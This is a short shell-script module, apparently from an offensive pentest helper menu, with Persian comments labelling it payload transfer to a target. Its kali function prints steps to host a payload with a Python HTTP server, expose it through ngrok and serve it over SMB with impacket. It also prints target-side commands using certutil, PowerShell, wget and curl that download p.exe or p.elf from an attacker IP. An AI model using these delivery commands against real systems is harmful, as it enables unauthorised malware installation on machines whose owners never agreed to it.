DESC="انتقال پیلود به هدف"
RISK="MED"

termux(){ echo "python3 -m http.server 8000"; }

kali(){
cat <<'EOF'
# سرور محلی:
python3 -m http.server 8000
# عمومی:
ngrok http 8000
# دانلود روی هدف ویندوز:
#   certutil -urlcache -f http://IP:8000/p.exe p.exe
#   powershell iwr http://IP:8000/p.exe -o p.exe
# دانلود روی هدف لینوکس:
#   wget http://IP:8000/p.elf
#   curl -O http://IP:8000/p.elf
# انتقال با SMB:
impacket-smbserver share . -smb2support
EOF
}